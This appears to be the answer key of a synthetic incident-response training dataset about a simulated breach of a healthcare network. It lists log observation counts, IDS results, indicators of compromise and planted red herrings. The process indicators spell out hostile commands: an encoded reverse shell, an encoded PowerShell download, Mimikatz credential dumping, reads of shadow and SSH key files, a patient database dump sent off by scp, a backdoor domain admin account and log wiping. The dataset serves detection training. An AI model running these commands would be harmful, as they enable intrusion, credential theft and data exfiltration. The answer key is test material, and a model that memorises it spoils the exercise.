| cf85c5e6-3149-42d1-aecd-ed55a8213da1 | ids | delayed: 1 |
| d06a5865-3579-48f2-b3cf-80e5cb324655 | ids | delayed: 1 |
| d57b7340-395a-483a-b62c-cfde8196e458 | ids | delayed: 1 |
| d7119afe-882c-42ee-9799-f3ff23bc3665 | ids | delayed: 1 |
| d7422891-239a-48d7-8560-e5748fe0ff37 | ids | delayed: 2 |
| d8f29b65-5743-49de-96cf-265d3ff5946f | ids | delayed: 2 |
| d96d8005-ebf3-46f0-a101-67ae2175ecb7 | ids | delayed: 1 |
| dc092a61-4f15-47c4-98eb-b052099b24f8 | ids | delayed: 1 |
| dd636fdb-7fec-432c-976c-6791df3edcbf | ids | delayed: 1 |
| e0a72fef-c143-4bf3-a614-52e3050c2d0e | ids | delayed: 1 |
| e53dee3c-1a9a-4539-b8ec-02cef47ae497 | ids | delayed: 1 |
| e750fbb7-d0fa-4116-92be-aa01c98c6881 | ids | delayed: 1 |
| ef1bd751-1a7d-48dd-b1c5-e65b7602faa4 | ids | delayed: 1 |
| evt-001 | asa | delayed: 6 |
| evt-001 | ecar | delayed: 2 |
| evt-001 | ids | filtered: 1 |
| evt-001 | web | delayed: 1 |
| evt-001 | zeek | delayed: 2, filtered: 4, visible: 4 |
| evt-002 | asa | delayed: 470, dropped: 2, filtered: 1 |
| evt-002 | ecar | delayed: 466, dropped: 7 |
| evt-002 | ids | delayed: 14 |
| evt-002 | web | delayed: 411, visible: 1 |
| evt-002 | zeek | delayed: 652, dropped: 3, filtered: 2, visible: 229 |
| evt-003 | syslog | delayed: 3 |
| evt-003 | zeek | visible: 2 |
| evt-004 | asa | delayed: 2 |
| evt-004 | ecar | delayed: 2 |
| evt-004 | web | delayed: 2 |
| evt-004 | zeek | delayed: 4 |
| evt-005 | asa | delayed: 2 |
| evt-005 | ecar | delayed: 4 |
| evt-005 | syslog | visible: 1 |
| evt-005 | web | delayed: 1 |
| evt-005 | zeek | delayed: 3 |
| evt-006 | asa | delayed: 31 |
| evt-006 | bash_history | visible: 6 |
| evt-006 | ecar | delayed: 63 |
| evt-006 | syslog | delayed: 4 |
| evt-006 | sysmon | delayed: 18 |
| evt-006 | windows_security | delayed: 6 |
| evt-006 | zeek | delayed: 24, visible: 7 |
| evt-007 | bash_history | visible: 3 |
| evt-007 | ecar | delayed: 6 |
| evt-008 | asa | delayed: 4, filtered: 1 |
| evt-008 | ecar | delayed: 8 |
| evt-008 | ids | delayed: 2 |
| evt-008 | syslog | delayed: 4 |
| evt-008 | windows_security | delayed: 3 |
| evt-008 | zeek | delayed: 3, visible: 5 |
| evt-009 | bash_history | visible: 2 |
| evt-009 | ecar | delayed: 4 |
| evt-010 | ecar | delayed: 8 |
| evt-010 | sysmon | delayed: 8 |
| evt-010 | windows_security | delayed: 2 |
| evt-011 | ecar | delayed: 1 |
| evt-011 | syslog | delayed: 1 |
| evt-011 | windows_security | delayed: 1 |
| evt-012 | asa | delayed: 3, filtered: 5 |
| evt-012 | ecar | delayed: 13 |
| evt-012 | sysmon | delayed: 2 |
| evt-012 | windows_security | delayed: 20 |
| evt-012 | zeek | delayed: 8, visible: 1 |
| evt-013 | asa | delayed: 3, filtered: 1 |
| evt-013 | ecar | delayed: 42 |
| evt-013 | sysmon | delayed: 38 |
| evt-013 | windows_security | delayed: 13, visible: 2 |
| evt-013 | zeek | delayed: 2, visible: 4 |
| evt-014 | ecar | delayed: 13 |
| evt-014 | sysmon | delayed: 13 |
| evt-014 | windows_security | delayed: 2 |
| evt-015 | asa | delayed: 2, visible: 1 |
| evt-015 | ecar | delayed: 23 |
| evt-015 | sysmon | delayed: 21 |
| evt-015 | windows_security | delayed: 11 |
| evt-015 | zeek | delayed: 4 |
| evt-016 | ecar | delayed: 34 |
| evt-016 | sysmon | delayed: 34 |
| evt-016 | windows_security | delayed: 10 |
| evt-017 | asa | delayed: 2 |
| evt-017 | ecar | delayed: 33 |
| evt-017 | sysmon | delayed: 32 |
| evt-017 | windows_security | delayed: 11 |
| evt-017 | zeek | delayed: 3 |
| evt-018 | asa | delayed: 23 |
| evt-018 | ecar | delayed: 31 |
| evt-018 | proxy | delayed: 10 |
| evt-018 | sysmon | delayed: 18 |
| evt-018 | windows_security | delayed: 15 |
| evt-018 | zeek | delayed: 48, dropped: 1, visible: 11 |
| evt-019 | asa | delayed: 4 |
| evt-019 | ecar | delayed: 4 |
| evt-019 | proxy | delayed: 4 |
| evt-019 | sysmon | delayed: 4 |
| evt-019 | zeek | delayed: 6, visible: 2 |
| evt-020 | asa | delayed: 22, filtered: 345 |
| evt-020 | ecar | delayed: 364, dropped: 3 |
| evt-020 | ids | delayed: 6, dropped: 2, filtered: 323 |
| evt-020 | sysmon | delayed: 12 |
| evt-020 | windows_security | delayed: 370, visible: 7 |
| evt-020 | zeek | delayed: 532, dropped: 1, filtered: 4, visible: 197 |
| evt-021 | asa | delayed: 90, visible: 1 |
| evt-021 | ecar | delayed: 90, dropped: 1 |
| evt-021 | ids | delayed: 18, filtered: 164 |
| evt-021 | windows_security | delayed: 89, visible: 2 |
| evt-021 | zeek | delayed: 134, visible: 48 |
| evt-022 | asa | delayed: 1 |
| evt-022 | ecar | delayed: 27 |
| evt-022 | sysmon | delayed: 26 |
| evt-022 | windows_security | delayed: 9 |
| evt-022 | zeek | delayed: 1 |
| evt-023 | asa | filtered: 5 |
| evt-023 | bash_history | visible: 12 |
| evt-023 | ecar | delayed: 42, dropped: 1 |
| evt-023 | syslog | delayed: 10 |
| evt-023 | windows_security | delayed: 3 |
| evt-023 | zeek | delayed: 7, visible: 1 |
| evt-024 | windows_security | delayed: 1 |
| evt-025 | asa | delayed: 4 |
| evt-025 | ecar | delayed: 32 |
| evt-025 | proxy | delayed: 1 |
| evt-025 | sysmon | delayed: 27 |
| evt-025 | windows_security | delayed: 9 |
| evt-025 | zeek | delayed: 6, visible: 2 |
| evt-026 | asa | delayed: 4, filtered: 3 |
| evt-026 | ecar | delayed: 8 |
| evt-026 | proxy | delayed: 3 |
| evt-026 | windows_security | delayed: 1 |
| evt-026 | zeek | delayed: 13, dropped: 1, visible: 2 |
| evt-027 | ecar | delayed: 1 |
| evt-027 | windows_security | delayed: 2 |
| evt-028 | bash_history | visible: 1 |
| evt-028 | ecar | delayed: 2 |
| evt-029 | bash_history | visible: 1 |
| evt-029 | ecar | delayed: 3 |
| evt-030 | asa | delayed: 2 |
| evt-030 | ecar | delayed: 27 |
| evt-030 | proxy | delayed: 1 |
| evt-030 | sysmon | delayed: 26 |
| evt-030 | windows_security | delayed: 7 |
| evt-030 | zeek | delayed: 4 |
| evt-031 | asa | filtered: 3 |
| evt-031 | ecar | delayed: 3 |
| evt-031 | windows_security | delayed: 3 |
| evt-031 | zeek | delayed: 5, dropped: 1 |
| evt-032 | ecar | delayed: 17 |
| evt-032 | sysmon | delayed: 17 |
| evt-032 | windows_security | delayed: 4 |
| evt-033 | ecar | delayed: 13 |
| evt-033 | sysmon | delayed: 12 |
| evt-033 | windows_security | delayed: 13 |
| evt-034 | ecar | delayed: 2 |
| evt-034 | sysmon | delayed: 1 |
| evt-034 | windows_security | delayed: 2 |
| evt-035 | ecar | delayed: 2 |
| evt-035 | syslog | delayed: 2 |
| evt-email-001 | asa | delayed: 8, filtered: 3 |
| evt-email-001 | ecar | delayed: 14 |
| evt-email-001 | proxy | delayed: 2 |
| evt-email-001 | syslog | delayed: 10 |
| evt-email-001 | sysmon | delayed: 5 |
| evt-email-001 | windows_security | delayed: 7 |
| evt-email-001 | zeek | delayed: 20, visible: 4 |
| evt-email-002 | asa | delayed: 2 |
| evt-email-002 | ecar | delayed: 3 |
| evt-email-002 | proxy | delayed: 1 |
| evt-email-002 | sysmon | delayed: 2 |
| evt-email-002 | windows_security | delayed: 1 |
| evt-email-002 | zeek | delayed: 3 |
| evt-email-003 | asa | delayed: 5, filtered: 2 |
| evt-email-003 | ecar | delayed: 23 |
| evt-email-003 | syslog | delayed: 12 |
| evt-email-003 | sysmon | delayed: 22 |
| evt-email-003 | windows_security | delayed: 12 |
| evt-email-003 | zeek | delayed: 13, visible: 5 |
| evt-email-004 | all | out_of_window: 2 |
| evt-email-004 | asa | delayed: 7, filtered: 3 |
| evt-email-004 | ecar | delayed: 12 |
| evt-email-004 | syslog | delayed: 18 |
| evt-email-004 | sysmon | delayed: 2 |
| evt-email-004 | windows_security | delayed: 7 |
| evt-email-004 | zeek | delayed: 19, visible: 9 |
| evt-email-005 | asa | delayed: 2 |
| evt-email-005 | ecar | delayed: 2 |
| evt-email-005 | syslog | delayed: 2 |
| evt-email-005 | windows_security | delayed: 1 |
| evt-email-005 | zeek | delayed: 6 |
| evt-email-006 | asa | delayed: 3 |
| evt-email-006 | ecar | delayed: 16 |
| evt-email-006 | syslog | delayed: 8 |
| evt-email-006 | sysmon | delayed: 15 |
| evt-email-006 | windows_security | delayed: 4 |
| evt-email-006 | zeek | delayed: 4, visible: 5 |
| evt-email-007 | asa | delayed: 6, filtered: 2 |
| evt-email-007 | ecar | delayed: 14 |
| evt-email-007 | syslog | delayed: 9 |
| evt-email-007 | windows_security | delayed: 5 |
| evt-email-007 | zeek | delayed: 20, visible: 2 |
| evt-email-008 | asa | delayed: 9, filtered: 2 |
| evt-email-008 | ecar | delayed: 31 |
| evt-email-008 | proxy | delayed: 2 |
| evt-email-008 | syslog | delayed: 11 |
| evt-email-008 | sysmon | delayed: 24 |
| evt-email-008 | windows_security | delayed: 11 |
| evt-email-008 | zeek | delayed: 15, visible: 11 |
| evt-email-009 | asa | delayed: 1 |
| evt-email-009 | ecar | delayed: 1 |
| evt-email-009 | syslog | delayed: 2 |
| evt-email-009 | sysmon | delayed: 1 |
| evt-email-009 | windows_security | delayed: 1 |
| evt-email-009 | zeek | delayed: 2 |
| evt-email-010 | asa | delayed: 1 |
| evt-email-010 | ecar | delayed: 1 |
| evt-email-010 | syslog | delayed: 2 |
| evt-email-010 | zeek | delayed: 5 |
| evt-email-011 | asa | delayed: 4, filtered: 2 |
| evt-email-011 | ecar | delayed: 9 |
| evt-email-011 | syslog | delayed: 9 |
| evt-email-011 | sysmon | delayed: 6 |
| evt-email-011 | windows_security | delayed: 7 |
| evt-email-011 | zeek | delayed: 10, visible: 9 |
| f2ed705f-d471-4b5c-bf47-753669dd3554 | ids | delayed: 2 |
| f78de7c8-4c11-4f15-9984-6df5ff268447 | ids | delayed: 1 |
| fb1274a6-b0be-475c-b0a4-ac3232c63749 | ids | delayed: 1 |
| fbc014ad-3c41-483d-8b44-4ae5895c14e4 | ids | delayed: 1 |
| ff9d9eb4-52c7-4ecb-87e4-f4a9f12dfd8a | ids | delayed: 1 |
| red_herring:rh-001 | ecar | delayed: 3 |
| red_herring:rh-001 | windows_security | delayed: 3 |
| red_herring:rh-002 | asa | delayed: 1 |
| red_herring:rh-002 | ecar | delayed: 34 |
| red_herring:rh-002 | sysmon | delayed: 24, dropped: 9 |
| red_herring:rh-002 | windows_security | delayed: 7, visible: 1 |
| red_herring:rh-002 | zeek | visible: 1 |
| red_herring:rh-003 | asa | delayed: 4 |
| red_herring:rh-003 | ecar | delayed: 7 |
| red_herring:rh-003 | ids | delayed: 1 |
| red_herring:rh-003 | proxy | delayed: 1 |
| red_herring:rh-003 | windows_security | delayed: 2 |
| red_herring:rh-003 | zeek | delayed: 6, visible: 2 |


## IDS Evaluation Summary

Observation totals: delayed=182, dropped=2, filtered=489, visible=5.

| Sensor | GID:SID | Candidates | Emitted | Policy Filtered | Origins | Digest |
|--------|---------|------------|---------|-----------------|---------|--------|
| snort-core | 1:2000334 | 1 | 1 | 0 | built_in=1 | `e8fd8b4ace19` |
| snort-core | 1:2000357 | 2 | 2 | 0 | built_in=2 | `b67e59f3388d` |
| snort-core | 1:2000560 | 3 | 3 | 0 | built_in=3 | `53ae2cc9c845` |
| snort-core | 1:2000575 | 1 | 1 | 0 | built_in=1 | `51a300a65b6c` |
| snort-core | 1:2002911 | 1 | 1 | 0 | authored_attachment=1 | `9de29ea32b7b` |
| snort-core | 1:2003068 | 1 | 1 | 0 | built_in=1 | `3de7857d17a2` |
| snort-core | 1:2016149 | 5 | 5 | 0 | built_in=5 | `b54ae0a4c120` |
| snort-core | 1:2024291 | 11 | 11 | 0 | built_in=11 | `17da11723d90` |
| snort-core | 1:2024392 | 1 | 1 | 0 | built_in=1 | `4cd652ff0815` |
| snort-core | 1:2027757 | 8 | 8 | 0 | built_in=8 | `25cd05126d84` |
| snort-core | 1:2027863 | 4 | 4 | 0 | built_in=4 | `6ab9e25e783e` |
| snort-core | 1:2027865 | 97 | 15 | 82 | authored_attachment=9, built_in=6 | `77fb145264ea` |
| snort-core | 1:2029706 | 336 | 13 | 323 | authored_attachment=6, built_in=7 | `53f8128f91ae` |
| snort-core | 1:382 | 2 | 2 | 0 | built_in=2 | `b941f896c943` |
| snort-perimeter | 1:2000334 | 1 | 1 | 0 | built_in=1 | `04ce2960269c` |
| snort-perimeter | 1:2000357 | 1 | 1 | 0 | built_in=1 | `174e11e9f9e6` |
| snort-perimeter | 1:2000428 | 2 | 2 | 0 | built_in=2 | `bc24ad6f7445` |
| snort-perimeter | 1:2000560 | 3 | 3 | 0 | built_in=3 | `e1d57011893a` |
| snort-perimeter | 1:2000575 | 5 | 5 | 0 | built_in=5 | `fbe510e8a226` |
| snort-perimeter | 1:2002910 | 15 | 14 | 1 | built_in=14 | `18f05f350f5e` |
| snort-perimeter | 1:2002911 | 1 | 1 | 0 | authored_attachment=1 | `416816bdc23b` |
| snort-perimeter | 1:2003068 | 2 | 2 | 0 | built_in=2 | `33425786e6d0` |
| snort-perimeter | 1:2010935 | 3 | 3 | 0 | built_in=3 | `ba766b0f65b3` |
| snort-perimeter | 1:2013028 | 2 | 2 | 0 | built_in=2 | `c92d60266bfc` |
| snort-perimeter | 1:2013504 | 3 | 3 | 0 | authored_attachment=1, built_in=2 | `a0b1852d38db` |
| snort-perimeter | 1:2016149 | 2 | 2 | 0 | built_in=2 | `939cc95cb98e` |
| snort-perimeter | 1:2016360 | 4 | 4 | 0 | built_in=4 | `3e292dd48deb` |
| snort-perimeter | 1:2018959 | 1 | 1 | 0 | built_in=1 | `19069f583176` |
| snort-perimeter | 1:2022476 | 5 | 5 | 0 | built_in=5 | `d2f4feae50b6` |
| snort-perimeter | 1:2023672 | 5 | 5 | 0 | built_in=5 | `ae062cabae32` |
| snort-perimeter | 1:2023882 | 4 | 4 | 0 | built_in=4 | `c6dfba2baec0` |
| snort-perimeter | 1:2024290 | 1 | 1 | 0 | built_in=1 | `c1ef39805915` |
| snort-perimeter | 1:2024291 | 4 | 4 | 0 | built_in=4 | `a9ac3f303a4e` |
| snort-perimeter | 1:2024392 | 1 | 1 | 0 | built_in=1 | `ebf4f344f2e1` |
| snort-perimeter | 1:2024897 | 1 | 1 | 0 | built_in=1 | `165f38bb0355` |
| snort-perimeter | 1:2025712 | 5 | 5 | 0 | built_in=5 | `0b80734f06a4` |
| snort-perimeter | 1:2025991 | 4 | 4 | 0 | built_in=4 | `5039d924f427` |
| snort-perimeter | 1:2027316 | 1 | 1 | 0 | built_in=1 | `765429aa1cd2` |
| snort-perimeter | 1:2027757 | 5 | 5 | 0 | built_in=5 | `2a2cce142426` |
| snort-perimeter | 1:2027863 | 2 | 2 | 0 | built_in=2 | `166dfadeee53` |
| snort-perimeter | 1:2027865 | 95 | 13 | 82 | authored_attachment=9, built_in=4 | `a4e7f60d9651` |
| snort-perimeter | 1:2028401 | 3 | 3 | 0 | built_in=3 | `1dd382be2d4e` |
| snort-perimeter | 1:2029706 | 6 | 6 | 0 | built_in=6 | `1119155484e4` |
| snort-perimeter | 1:366 | 8 | 8 | 0 | built_in=8 | `fdb05ed89b36` |
| snort-perimeter | 1:382 | 5 | 5 | 0 | built_in=5 | `635dd289fb0c` |
| snort-perimeter | 1:384 | 2 | 2 | 0 | built_in=2 | `54a3ada9c8e9` |


## Indicators of Compromise (IOCs)

### Network IOCs

- 10.10.1.35 (Attacker IP)
- 10.10.1.35:3389 (Lateral Movement)
- 10.10.1.99 (Attacker IP)
- 10.10.2.10:389 (Internal Server)
- 10.10.2.30:22 (Lateral Movement)
- 10.10.3.10:443 (Web Scan Target)
- 10.10.3.20:22 (Internal Server)
- 10.10.4.10:22 (Lateral Movement)
- 203.14.220.10:443 (C2 Server)
- 2j3rhpi2329sn.top (DGA Domain)
- 30rgw6r7503.top (DGA Domain)
- 45.33.32.30:443 (Beacon Target)
- 45.33.32.30:443 (C2 Server)
- 45.33.32.30:443 (Denied Beacon Target)
- 45.33.32.30:8443 (C2 Server)
- 6cja6syvo02mu.top (DGA Domain)
- DC-01.meridianhcs.local (Malicious DNS Query)
- Message-ID: <100000I9EMNA.1000OREDIL@meridianhcs.com>
- Message-ID: <1000016ONZTK.10015EDCND@meridianhcs.com>
- Message-ID: <121609FF-AFF2-1350-BCEC-8A52032BE7D0@meridianhcs.com>
- Message-ID: <1486572785.976919.3e76dbd7@meridianhcs.com>
- Message-ID: <1746897100.499514.89c6aefa@meridianhcs.com>
- Message-ID: <billing-a1f65b41-3807664@medclaims-processing.net>
- Message-ID: <notices-b9dac45a-8235363@benefits-serviceportal.com>
- Message-ID: <workspace-e2b1dcaf-9440641@docflow-health.net>
- Port 22 (scan target)
- Port 3306 (scan target)
- Port 443 (scan target)
- Port 80 (scan target)
- Port 8080 (scan target)
- Port 8443 (scan target)
- SMTP Zeek UID: C0Wp0MnbqqRlQdYvdct
- SMTP Zeek UID: C0cIn3Ce8nGo61EsR7
- SMTP Zeek UID: C1D1ayu6jEjhrnelTgW
- SMTP Zeek UID: C6GBMnd9QFmFt8AL4G
- SMTP Zeek UID: C7OR7Wv29Uhu0Y3AU95
- SMTP Zeek UID: CG49DtJTQX1Y1SyE1x
- SMTP Zeek UID: CMlzhNfpPVGKD92JC3A
- SMTP Zeek UID: CQ6HQNe3CnDwJqltLM
- SMTP Zeek UID: CWBysHAr9TXwgUDCcAG
- SMTP Zeek UID: CWssQOh286yy4lYBVm
- SMTP Zeek UID: CeQzGfFvnBEHb55In
- SMTP Zeek UID: CqbgFvLO3A3PLx2kbu
- SMTP Zeek UID: CtAlT79R2kOQjDRyA3
- SMTP Zeek UID: CwENvZ6MjzxIQqt9AOi
- SMTP Zeek UID: CxyKl7gN8zEKprYHXE
- Zeek UID: CAyQq6qQy9cnDb7aBl
- Zeek UID: CBW2qLwsexcKLiuQs
- Zeek UID: CBfdQLnT1W0s7FMQHI
- Zeek UID: CMxHlNoNFlJign6DRyL
- Zeek UID: Ce45ZtfWFCHOUGOCGt
- Zeek UID: CicVxJeCErOPnWqgt7
- Zeek UID: CopMRqEZn3CikVjALy
- Zeek UID: CqAYuDEihWYbsfZcQ2
- Zeek UID: CrqELHRVHa8Nk721fmG
- Zeek UID: CsOyjHl8cVt94jNZB9
- api.westbridge-services.net (Malicious DNS Query)
- edge.westbridge-services.net (Malicious DNS Query)
- ewnjsaqf1rasgez5.top (DGA Domain)
- metrics.westbridge-services.net (Malicious DNS Query)
- ns1.westbridge-services.cloud (DNS Tunnel Endpoint)
- qrdqtp5nhn66chp00.top (DGA Domain)

### Process IOCs

- /bin/bash
- /usr/bin/cat
- /usr/bin/find
- /usr/bin/gzip
- /usr/bin/ls
- /usr/bin/mysqldump
- /usr/bin/nmap
- /usr/bin/scp
- /usr/bin/shred
- /usr/sbin/ip
- C:\Windows\System32\PSEXESVC.exe
- C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
- C:\Windows\System32\cmd.exe
- C:\Windows\System32\ms-index-service.exe
- C:\Windows\System32\net.exe
- C:\Windows\System32\sc.exe
- C:\Windows\System32\schtasks.exe
- C:\Windows\System32\wevtutil.exe
- C:\Windows\System32\whoami.exe
- Injection Target: C:\Windows\System32\lsass.exe
- Scheduled Task: \Microsoft\Windows\Maintenance\DeviceSync
- Service: DeviceSyncSvc
- Service: PSEXESVC
- `PSEXESVC.exe -accepteula`
- `bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC80NS4zMy4zMi4zMC84NDQzIDA+JjEi | base64 -d | bash'`
- `cat /etc/hosts`
- `cat /etc/passwd`
- `cat /etc/resolv.conf`
- `cat /etc/shadow`
- `cat /root/.ssh/id_rsa`
- `cat /var/www/html/config.php`
- `cmd.exe /c whoami && hostname`
- `find /opt/ehr -name '*credential*' -maxdepth 3`
- `gzip -9 /tmp/rpt_0318.sql`
- `history -c && cat /dev/null > ~/.bash_history`
- `ip addr show`
- `ls -la /root/.ssh`
- `ms-index-service.exe "privilege::debug" "sekurlsa::logonpasswords" exit`
- `mysqldump --single-transaction ehr patients insurance_claims > /tmp/rpt_0318.sql`
- `net group "Domain Admins" /domain`
- `net group "Domain Admins" svc_mhsync /add /domain`
- `net user /domain`
- `net user svc_mhsync /delete /domain`
- `net user svc_mhsync MhsSvc!2024 /add /domain`
- `net view /domain`
- `net view \\FILE-SRV-01`
- `nmap -sT -p 22,80,443,445,3306 10.10.2.0/24`
- `nmap -sn 10.10.2.0/24`
- `powershell.exe -NoProfile -Command "Compress-Archive -Path \\FILE-SRV-01\Finance\Q1\*,\\FILE-SRV-01\Patients\Exports\* -DestinationPath C:\ProgramData\Microsoft\cache_7f3a.zip"`
- `powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwBhAHAAaQAuAHcAZQBzAHQAYgByAGkAZABnAGUALQBzAGUAcgB2AGkAYwBlAHMALgBuAGUAdAAvAHYAMgAvAG0AYQBuAGkAZgBlAHMAdAAiACkA`
- `sc.exe create DeviceSyncSvc binPath= C:\Windows\System32\DeviceSyncSvc.exe obj= LocalSystem start= auto`
- `schtasks.exe /Create /TN "\Microsoft\Windows\Maintenance\DeviceSync" /SC HOURLY /TR "C:\Windows\System32\DeviceSyncSvc.exe" /RU SYSTEM`
- `scp /tmp/rpt_0318.sql.gz root@10.10.2.30:/tmp/.cache/rpt_0318.sql.gz`
- `shred -u /root/.bash_history`
- `wevtutil cl Security`
- `whoami /all`

### User IOCs

- Group: Domain Admins (compromised account)
- SYSTEM (compromised account)
- aisha.johnson (compromised account)
- aisha.johnson (Spray Target) (compromised account)
- apache (compromised account)
- diego.ramirez (compromised account)
- diego.ramirez (Spray Target) (compromised account)
- evelyn.brooks (compromised account)
- lina.nguyen (compromised account)
- marcus.chen (compromised account)
- marcus.chen (Explicit Credential Target) (compromised account)
- omar.haddad (compromised account)
- priya.patel (compromised account)
- root (compromised account)
- sophia.martinez (Spray Target) (compromised account)
- svc_mhsync (compromised account)

### File IOCs

- %SystemRoot%\PSEXESVC.exe
- /root/.bash_history
- /tmp/rpt_0318.sql
- C:\Windows\System32\DeviceSyncSvc.exe
- artifacts/email/benefits-confirmation-msg.eml
- artifacts/email/docflow-ai-summary-msg.eml
- artifacts/email/ehr-release-note-msg.eml
- artifacts/email/executive-operating-note-msg.eml
- artifacts/email/finance-forward-to-it-msg.eml
- artifacts/email/internal-reset-lure-msg.eml
- artifacts/email/vendor-interface-package-msg.eml


## Red Herrings

The following events appear suspicious but are benign. They are included to make the dataset more realistic.

| Timestamp | Actor | System | Activity | Why It's Benign |
|-----------|-------|--------|----------|-----------------|
| 2024-03-18 13:04:54 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:04:59 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:05:00 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:05:07 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 14:04:55 UTC | lina.nguyen | WS-LNGUYEN-01 | Developer refreshes Ubuntu package metadata from the public archive | Routine package maintenance uses the APT HTTP user agent and triggers a low-priority policy alert. |
| 2024-03-18 17:09:34 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
| 2024-03-18 17:09:36 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
| 2024-03-18 17:09:37 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
